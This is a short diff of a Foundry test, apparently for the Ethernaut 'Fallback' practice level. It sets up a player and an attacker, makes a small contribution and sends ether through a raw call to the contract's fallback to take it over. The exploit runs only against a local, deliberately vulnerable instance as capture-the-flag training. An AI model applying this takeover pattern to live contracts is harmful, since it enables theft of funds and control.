@@ -16,15 +16,18 @@ contract FallbackTest is Test {
         instance = payable(factory.createInstance(player));
 
         emit log_address(Fallback(instance).owner());
-        emit log_address(Fallback(instance).owner());
+        emit log_address(address(factory));
     }
 
     function testFallbackAttack() public {
         // SETUP
-        vm.startPrank(attacker);
+        vm.deal(player, 1 ether);
         vm.deal(attacker, 1 ether);
 
         // EXPLOIT
+        vm.prank(player);
+        Fallback(instance).contribute{value: 1}();
+        vm.startPrank(attacker);
         Fallback(instance).contribute{value: 1}();
         (bool success,) = instance.call{value: 1}("");
 
